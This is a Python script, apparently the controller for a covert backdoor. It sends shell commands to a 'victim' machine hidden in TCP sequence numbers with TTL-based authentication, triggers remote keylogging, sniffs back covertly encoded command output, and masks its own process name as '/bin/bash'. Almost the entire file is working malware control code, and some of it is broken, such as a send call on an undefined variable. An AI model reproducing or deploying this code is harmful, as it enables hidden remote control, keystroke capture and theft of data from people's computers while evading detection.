#!/usr/bin/python3

import optparse
import os
import subprocess
import sys
import time
from bkutil import *
from multiprocessing import Process
from cryptoutil import encrypt, decrypt
from scapy.all import *
import _thread
import setproctitle

"""
Setup: pip3 install pycryptodome setproctitle scapy watchdog3
"""

TTL = 222
TTLKEY = 234
# random secret key (both the client and server must match this key)

victim = ("192.168.0.3", 9999)
messages = []
authentication = "1337"
setFlag = "E"

myip = ("192.168.0.3", 66)


def secret_send(msg: str, type: str = 'command'):
    """
    Keyword arguments:
    msg      - payload being sent
    type     - file or command (default:command)
    """
    if(type == "command"):
        # Convert message to ASCII to bits
        msg = message_to_bits(msg)
        chunks = message_spliter(msg)
        packets = packatizer(chunks)
        send(packet, verbose=True)


def packatizer(msg):
    """[summary]
    
    Arguments:
        msg {[type]} -- [description]
    
    Returns:
        [type] -- [description]
    """

    # Create the packets array as a placeholder.
    packets = []
    # If the length of the number is larger than what is allowed in one packet, split it
    counter = 0

    # If not an array (if there is only one packet.)
    if(type(msg) is str):
        # The transmissions position and total will be 1.
        # i.e. 1/1 message to send.
        packets.append(craft(msg))
    # If an array (if there is more than one packet)
    elif(type(msg) is list):
        while (counter < len(msg)):
            # The position will be the array element and the total will be the
            # length.
            # i.e. 1/3 messages to send.
            packets.append(craft(msg[counter]))
            counter = counter + 1
    packets.append(IP(dst=victim[0], ttl=TTL) /
                   TCP(sport=myip[1], dport=victim[1], flags="U"))
    return packets


def craft(data: str) -> IP:
    """[summary]
    
    Arguments:
        data {str} -- [description]
    
    Returns:
        IP -- [description]
    """

    global TTL
    global setFlag
    # The payload contains the unique password, UID, position number and total.
    packet = IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1], dport=victim[1],
                                            seq=int(str(data), 2), flags=setFlag)
    return packet


def server():
    """[summary]
    """

    while True:
        try:
            # Prompt user for the command they would like to execute on the backdoor.
            command = input("ENTER COMMAND: {}:".format(victim[0]))
        except EOFError as e:
            print(e)
        # Print the command so that the user knows what they typed.
        print(command)
        # If the user types "exit". shutdown the program.
        if(command == "exit"):
            sys.exit()
        elif(command == "keylog"):
            send(IP(dst=victim[0], ttl=TTL) /
                           TCP(sport=myip[1], dport=victim[1], flags="P"))
        else:
            secret_send(command)


def commandResult(packet):
    """[summary]
    
    Arguments:
        packet {[type]} -- [description]
    """

    global TTLKEY
    global messages
    ttl = packet[IP].ttl
    if(packet.haslayer(IP) and ttl == TTLKEY):
        # checks if the flag has been set to know it contains the secret results
        flag = packet['TCP'].flags
        #  the client set an "Echo" flag to make sure the receiver knows it's truly them
        if flag == 0x40:
            field = packet[TCP].seq
            # Converts the bits to the nearest divisible by 8
            covertContent = lengthChecker(field)
            messages.append(text_from_bits(covertContent))
        # End Flag detected
        elif flag == 0x20:
            payload = str(''.join(messages)[2:-2]).replace("\\n", '\n')
            print('\n', payload)
            messages = []


def commandSniffer():
    sniff(filter="tcp and host "+victim[0], prn=commandResult)


setproctitle.setproctitle("/bin/bash")  # set fake process name
# print(setproctitle.getproctitle())

sniffThread = threading.Thread(target=commandSniffer)
sniffThread.daemon = True
sniffThread.start()

server()
